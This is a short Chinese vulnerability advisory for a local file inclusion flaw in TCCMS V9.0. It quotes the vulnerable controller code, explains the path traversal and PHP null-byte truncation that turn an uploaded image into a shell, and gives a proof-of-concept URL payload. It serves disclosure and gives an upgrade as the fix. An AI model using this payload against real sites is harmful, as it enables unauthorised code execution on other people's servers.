# TCCMS V9.0 本地文件包含
---
### 1. 漏洞成因

在system/core/controller.class.php中run函数对参数过滤不严

```
public function Run() {
    $this->Analysis();
    $this->control = $_GET['c'];
    $this->action = $_GET['a'];
    if ($_GET['a'] === "list") {
        $this->action = "listAll";
    }
    //子目录支持
    $dir = '';
    if (isset($_GET['d'])) {
    	$dir .= $_GET['d'].'/';
    }
    $adminDir = '/controller/';
    if (defined('IN_ADMIN')) {
    	$adminDir = '/admin/';
    }
    //子模块支持
    $module = strcmp(MODULE, "/") == 0 ? 'app' : MODULE;
    $controlFile = ROOT_PATH . '/' . $module . $adminDir . $dir.$this->control. '.class.php';
    if (!file_exists($controlFile)) {
            $this->setValue("error",$this->control.Config::lang("CONTROLLERNOTEXISTS"));
        $this->forward("error.html");
        exit;
    }
    include($controlFile);
    if (!class_exists($this->control)) {
        $this->setValue("error",$this->control.Config::lang("CONTROLLERNOTDEFINED"));
        $this->forward("error.html");
        exit;
    }
    $instance = new $this->control();
    if (!method_exists($instance, $this->action)) {
        $this->setValue("error", $this->action .Config::lang("METHODNOTFIND"));
        $this->forward("error.html");
        exit;
    }
    $methodName = $this->action;
    $instance->$methodName();
}
```
从GET中获取的d参数未进行过滤，结合在php5.3.4以下的版本的空字符截断可进行本地文件包含并获取shell，本地文件可在注册后进行图片上传得到

### 2. 漏洞验证

poc:

```
http://xxx.com/index.php?d=../../uploadfiles/local_filename.jpg%00
```
![](http://images.sebug.net/contribute/13f54833-39b0-421c-af0b-c874998bd7c4-tccms_upload.png)

### 3. 影响版本

TCCMS V9.0

### 4. 防护方案

升级版本